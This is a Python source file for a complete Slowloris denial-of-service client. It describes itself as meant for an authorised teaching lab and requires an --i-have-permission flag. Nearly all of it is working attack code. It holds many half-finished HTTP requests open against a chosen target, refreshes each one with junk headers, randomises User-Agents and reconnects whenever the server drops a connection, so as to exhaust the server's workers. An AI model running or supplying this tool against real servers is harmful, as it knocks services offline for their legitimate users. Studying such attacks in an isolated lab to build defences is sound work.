#!/usr/bin/env python3
"""
slowloris.py -- a Slowloris denial-of-service client, for an authorised lab.

WHAT IT DOES
------------
Slowloris does not need bandwidth. It opens a large number of TCP connections
and then sends each request *almost* completely, stopping just short of the
blank line that terminates the HTTP headers:

    GET /?abc123 HTTP/1.1\\r\\n
    Host: demo.acme.test\\r\\n
    User-Agent: ...\\r\\n
    Accept: text/html,*/*\\r\\n
    <-- and then nothing

The server is now holding a worker slot, waiting for headers that never
arrive. Every few seconds this script pushes one more junk header down each
socket so the connection never goes idle long enough to be reaped. A server
that dedicates one worker/thread/process per connection -- Apache prefork, for
instance -- runs out of workers and stops answering real clients, while the
attacker's own bandwidth usage stays in the tens of kilobytes per second.

AUTHORISATION
-------------
This tool exists for an isolated teaching lab (see the repository README). Running
it against systems you do not own, or do not have explicit written permission to
test, is a criminal offence in most jurisdictions. The --i-have-permission flag
is not decoration; it is the acknowledgement that you have that authorisation.

Requires Python 3.8+ and nothing else.
"""

from __future__ import annotations

import argparse
import random
import selectors
import signal
import socket
import string
import sys
import time

BANNER = r"""
  ___ _                 _
 / __| |_____ __ ___| |_ _ _ ___ _ _
 \__ \ / _ \ V  V / _` | '_/ _ \ ' \
 |___/_\___/\_/\_/\__,_|_| \___/_||_|          (lab use only)
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "curl/8.6.0",
]

# Junk header names. The value is randomised each time so no two headers on a
# connection look alike.
HEADER_NAMES = ["X-a", "X-b", "X-c", "X-d", "X-e", "X-f", "X-g", "X-h", "X-i"]

ALPHABET = string.ascii_letters + string.digits


class Slowloris:
    """Keeps a pool of half-open HTTP requests alive against one target."""

    def __init__(self, opts: argparse.Namespace) -> None:
        self.target = opts.target
        self.port = opts.port
        self.socket_count = opts.sockets
        self.interval = opts.interval
        self.timeout = opts.timeout
        self.duration = opts.duration
        self.report_every = max(1, opts.report_every)
        self.verbose = opts.verbose
        self.quiet = opts.quiet
        self.user_agent = opts.user_agent or random.choice(USER_AGENTS)

        self.host_header = self.target if self.port == 80 else "%s:%d" % (self.target, self.port)

        self.selector = selectors.DefaultSelector()
        self.conns: set[socket.socket] = set()

        self.headers_sent = 0
        self.connections_made = 0
        self.reconnects = 0
        self.connect_failures = 0
        self.started_at = 0.0
        self.stopping = False

    # -- logging -----------------------------------------------------------

    def log(self, message: str) -> None:
        print("[slowloris] %s" % message, flush=True)

    # -- socket plumbing ---------------------------------------------------

    @staticmethod
    def _token(length: int = 8) -> str:
        return "".join(random.choice(ALPHABET) for _ in range(length))

    def _connect(self) -> socket.socket:
        """Open one socket and send a deliberately unfinished request."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)

        try:
            sock.connect((self.target, self.port))
        except OSError:
            sock.close()
            raise

        # Note the missing final CRLF: the header block is never terminated.
        request = (
            "GET /?%s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: text/html,application/xhtml+xml,*/*\r\n"
            "Accept-Language: en-GB,en;q=0.9\r\n"
            % (self._token(), self.host_header, self.user_agent)
        )

        try:
            sock.sendall(request.encode("ascii", "ignore"))
        except OSError:
            sock.close()
            raise

        sock.setblocking(False)
        self.headers_sent += 5
        self.connections_made += 1
        return sock

    def _spawn(self) -> bool:
        """Add one socket to the pool. Returns False if the target refused us."""
        try:
            sock = self._connect()
        except OSError:
            self.connect_failures += 1
            return False

        self.selector.register(sock, selectors.EVENT_READ, sock)
        self.conns.add(sock)
        return True

    def _retire(self, sock: socket.socket, reconnect: bool = True) -> None:
        self.conns.discard(sock)
        try:
            self.selector.unregister(sock)
        except (KeyError, ValueError):
            pass
        try:
            sock.close()
        except OSError:
            pass

        if reconnect and not self.stopping:
            if self._spawn():
                self.reconnects += 1

    def _nudge(self, sock: socket.socket) -> None:
        """Send a single junk header to reset the server's idle timer."""
        header = "%s: %s\r\n" % (random.choice(HEADER_NAMES), self._token(16))
        sock.sendall(header.encode("ascii"))
        self.headers_sent += 1

    def _nudge_all(self) -> None:
        for sock in list(self.conns):
            try:
                self._nudge(sock)
            except BlockingIOError:
                # Send buffer momentarily full; it will drain. Not an error.
                continue
            except OSError:
                self._retire(sock)

    # -- reporting ---------------------------------------------------------

    def _report(self, now: float) -> None:
        if self.quiet:
            return
        elapsed = max(0.001, now - self.started_at)
        self.log(
            "alive=%-5d sent=%-8d reconnects=%-6d connect_failures=%-6d "
            "elapsed=%4ds  %.1f headers/s"
            % (
                len(self.conns),
                self.headers_sent,
                self.reconnects,
                self.connect_failures,
                int(elapsed),
                self.headers_sent / elapsed,
            )
        )

    # -- lifecycle ---------------------------------------------------------

    def _handle_signal(self, signum: int, _frame: object) -> None:
        if not self.stopping:
            self.log("caught signal %d -- closing %d sockets" % (signum, len(self.conns)))
        self.stopping = True

    def _install_signal_handlers(self) -> None:
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                signal.signal(sig, self._handle_signal)
            except (ValueError, OSError):
                pass

    def run(self) -> int:
        self.started_at = time.time()
        self._install_signal_handlers()

        self.log("target          : %s:%d" % (self.target, self.port))
        self.log("sockets         : %d" % self.socket_count)
        self.log("keep-alive      : one header every %gs per socket" % self.interval)
        self.log(
            "duration        : %s"
            % ("unlimited (Ctrl-C to stop)" if self.duration <= 0 else "%ds" % self.duration)
        )

        opened = 0
        for _ in range(self.socket_count):
            if self._spawn():
                opened += 1
            elif opened == 0 and self.connect_failures >= 10:
                # Nothing is answering: bail out instead of sitting on 150 x
                # --timeout seconds of connect attempts.
                self.log("ERROR: %s:%d is not accepting connections." % (self.target, self.port))
                self.shutdown()
                return 1

        self.log("opened %d/%d sockets" % (opened, self.socket_count))

        deadline = None if self.duration <= 0 else self.started_at + self.duration
        last_nudge = time.time()
        next_report = self.started_at + self.report_every

        while not self.stopping:
            now = time.time()

            if deadline is not None and now >= deadline:
                self.log("duration reached -- shutting down")
                break

            for key, _events in self.selector.select(timeout=0.5):
                sock = key.fileobj
                if sock not in self.conns:
                    continue
                try:
                    data = sock.recv(4096)
                except BlockingIOError:
                    continue
                except OSError:
                    self._retire(sock)
                    continue

                if data == b"":
                    # Server closed us: header timeout, 408, or it is simply
                    # out of workers. Either way, reconnect and keep pressing.
                    self._retire(sock)

            now = time.time()
            if now - last_nudge >= self.interval:
                self._nudge_all()
                last_nudge = now

            if now >= next_report:
                self._report(now)
                next_report = now + self.report_every

        self.shutdown()
        return 0

    def shutdown(self) -> None:
        for sock in list(self.conns):
            try:
                sock.close()
            except OSError:
                pass
        self.conns.clear()

        try:
            self.selector.close()
        except Exception:
            pass

        if self.started_at:
            elapsed = time.time() - self.started_at
            self.log(
                "stopped after %ds -- %d connections opened, %d headers sent, "
                "%d reconnects, %d connect failures"
                % (
                    int(elapsed),
                    self.connections_made,
                    self.headers_sent,
                    self.reconnects,
                    self.connect_failures,
                )
            )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Slowloris DoS client for an authorised training lab.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--target", required=True, help="victim IP or hostname")
    parser.add_argument("--port", type=int, default=80, help="victim TCP port")
    parser.add_argument("--sockets", type=int, default=150, help="how many half-open connections to hold")
    parser.add_argument("--interval", type=float, default=10.0, help="seconds between keep-alive headers")
    parser.add_argument("--timeout", type=float, default=4.0, help="connect/write timeout in seconds")
    parser.add_argument("--duration", type=int, default=0, help="stop after N seconds (0 = run until stopped)")
    parser.add_argument("--user-agent", default=None, help="fixed User-Agent (default: random)")
    parser.add_argument("--report-every", type=int, default=5, help="seconds between progress lines")
    parser.add_argument("--verbose", action="store_true", help="log every keep-alive sweep")
    parser.add_argument("--quiet", action="store_true", help="suppress progress lines")
    parser.add_argument(
        "--i-have-permission",
        action="store_true",
        help="acknowledge that you are authorised to test the target",
    )
    return parser


def main(argv: list[str] | None = None) -> int:
    opts = build_parser().parse_args(argv)

    if not opts.i_have_permission:
        sys.stderr.write(
            "\nRefusing to run.\n\n"
            "  This is a denial-of-service tool. You must confirm you own the\n"
            "  target or hold explicit written permission to test it.\n\n"
            "  Re-run with --i-have-permission once you have confirmed that.\n\n"
        )
        return 2

    if opts.sockets < 1:
        sys.stderr.write("--sockets must be at least 1\n")
        return 2

    if not opts.quiet:
        print(BANNER, file=sys.stderr)

    attack = Slowloris(opts)
    try:
        return attack.run()
    except KeyboardInterrupt:
        attack.stopping = True
        attack.shutdown()
        return 0


if __name__ == "__main__":
    sys.exit(main())
